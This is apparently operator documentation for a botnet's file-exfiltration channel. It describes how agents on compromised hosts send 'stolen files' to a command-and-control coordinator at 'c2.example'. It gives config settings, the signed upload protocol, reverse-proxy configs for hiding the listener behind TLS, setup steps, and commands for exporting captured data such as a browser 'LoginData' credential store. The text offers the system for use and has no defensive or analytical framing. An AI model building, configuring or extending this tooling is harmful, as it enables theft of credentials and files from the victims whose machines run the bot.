# Artifacts

Stolen files leave the bot automatically: the agent drains its SQLite spool to a
coordinator HTTP endpoint, and the coordinator stores bytes plus metadata.

Uploads are authenticated per agent. There is no shared upload secret to bake
into a payload: the agent signs each request with the same Ed25519 key it uses
for heartbeats, and the coordinator verifies that signature against the key it
stored for the route tag in the URL. A leaked payload from one host cannot be
used to upload as another.

## Bot side

`config.toml`:

```toml
artifact_url = "https://c2.example"
# optional extra gate, see "Token" below
# artifact_token = "…"
```

After every cycle the worker uploads up to four spool rows (each ≤1 MiB, the
spool's own cap). Each row is one POST to `{artifact_url}/artifact/<route-tag>`
with `x-sha256`, `x-kind`, base64 `x-path` and `x-signature`. The signature is
Ed25519 over the ASCII string `<sha256-hex>:<tag-hex>`, base64-encoded, made with
`<state>/agent.key`. The digest covers the exact request body, so the signature
covers the content and the destination tag together.

A 2xx deletes the row; anything else leaves it queued and retries next cycle.
Uploads run on the blocking pool and never fail the poll loop.

`artifact_url` must be `http(s)`. The agent has no TLS listener or pinning of its
own, so:

- `http://` is correct only for loopback or a trusted segment. The body, the
  `x-token` value and the file paths are cleartext on the wire.
- `https://` is required for anything off-host. TLS is terminated by your proxy.
  The agent trusts the bundled Mozilla roots (rustls `webpki-roots`), so a
  public CA certificate works and a self-signed or private-CA certificate fails.
  There is no pinning and no way to add a private root short of rebuilding.

## Coordinator side

```sh
coordd --state /srv/coord --artifact-bind 127.0.0.1:8790
```

Bind loopback and reverse-proxy it with TLS and a request-body limit. The
listener is plain HTTP by design; it is not meant to face the internet directly.

### Token

A token is an optional shared second factor on top of the signature:

```sh
head -c 24 /dev/urandom | base64 > /srv/coord/artifact.token
```

`coordd` reads `<state>/artifact.token` by default (`--artifact-token-file` for
another path). A missing or empty file disables the check. When set, the client
must send `x-token: <value>`, or `Authorization: Bearer <value>`.

The token is checked first and rejects before any body is read. It is one secret
for the whole fleet: good as a cheap filter in front of the signature check, bad
as the only control because it has to live in every `config.toml`. Rotate by
rewriting the file; `coordd` re-reads it on restart.

Certificate handling is the proxy's job. Do not terminate TLS inside `coordd`.

## Reverse proxy

Caddy:

```caddyfile
c2.example {
    handle /artifact/* {
        request_body {
            max_size 1MB
        }
        reverse_proxy 127.0.0.1:8790
    }
    handle /health {
        reverse_proxy 127.0.0.1:8790
    }
}
```

nginx:

```nginx
server {
    listen 443 ssl;
    server_name c2.example;
    ssl_certificate     /etc/letsencrypt/live/c2.example/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/c2.example/privkey.pem;

    client_max_body_size 1m;
    client_body_timeout 30s;

    location /artifact/ {
        proxy_pass http://127.0.0.1:8790;
        proxy_request_buffering on;
    }
    location = /health {
        proxy_pass http://127.0.0.1:8790;
    }
}
```

Set `client_max_body_size`/`max_size` to exactly 1 MiB or a little more: the
server also answers `413`, but a proxy cap stops an oversized body with less
work.

## Setup, end to end

1. **Coordinator.** Start `coordd` with `--artifact-bind 127.0.0.1:8790` on the
   same state directory as the rest of coordd. Nothing else needs to be served
   publicly: the relay and the artifact endpoint are separate listeners.
2. **Token (optional).** Write one file, e.g.
   `head -c 24 /dev/urandom | base64 > /srv/coord/artifact.token`, `chmod 600`.
   Restart `coordd` after creating or rotating it.
3. **TLS + proxy.** Put Caddy or nginx in front with a real certificate, body
   limit and only `/artifact/` plus `/health` exposed.
4. **Agent config.** In the payload `config.toml`, set
   `artifact_url = "https://c2.example"` — scheme, host, optional base path,
   no trailing `/artifact`. Add `artifact_token` only if you set the file in
   step 2.
5. **Reachability.** The host must be able to resolve and reach the proxy and
   trust its certificate. A private CA means the uploads will fail every cycle
   and stay spooled, with no other error surfaced.
6. **First contact.** The tag→key lookup means the host must have sent at least
   one heartbeat before its first upload; uploads before enrolment get `403`.
   This is expected on a fresh host and clears on the next cycle.
7. **Verify.** Run one cycle and look for the row:

   ```sh
   coordctl --state /srv/coord artifacts
   coordctl --state /srv/coord artifact export 12 --out ./LoginData
   ```

   If nothing arrives, `coordd` logs nothing per request: check the proxy log
   status, then `curl http://127.0.0.1:8790/health` from the coordinator itself.

## Protocol

- `POST /artifact/<16 hex tag>` — headers above, raw body. Checks run in this
  order: `401` bad/missing token (only when a token file exists), `413` missing
  or over-1 MiB `content-length`, `422` digest mismatch, `400` bad tag,
  `403` unknown tag, `401` missing or bad signature, then `200` with
  `{"id":N}` or `{"duplicate":true}`.
- `GET /health` — liveness, no auth.

A `403` on an otherwise valid request usually means the tag has never
heartbeated, or the agent's key was rotated without a new heartbeat.

Storage is `<state>/artifacts/<tag>/<sha16>-<flattened-path>` and the database
deduplicates on `(agent_pub, sha256)`. A file write happens only after the row is
new, so a repeat upload does not touch disk.

Files are encrypted at rest with XChaCha20-Poly1305 under
`<state>/artifact.key` (created 0600 on first start), `nonce || ciphertext`.
`artifact export` decrypts; the database metadata (paths, digests, kinds) stays
plaintext.

## Operations

```sh
coordctl --state /srv/coord artifacts
coordctl --state /srv/coord artifact export 12 --out ./LoginData
coordctl --state /srv/coord artifact prune --before 1760000000
```

`prune` deletes rows and their files; nothing else removes artifacts.

## Limits

- One artifact per task is not enforced: the recon mod spools every match, so a
  wide scan can fill the bot's 512 MiB spool. The spool prunes its oldest 10% on
  overflow and the uploader drains four rows per cycle.
- No resumption or multipart: a row over 1 MiB cannot exist by construction.
- Artifact bytes and the coordinator database are encrypted at rest; the bot
  spool is still plaintext.
- Tag→key lookup means an artifact is accepted only from a host that has sent a
  heartbeat first.
- `x-signature` is not replay-protected: the same body may be posted again, and
  the digest dedupe is what stops duplicate writes.
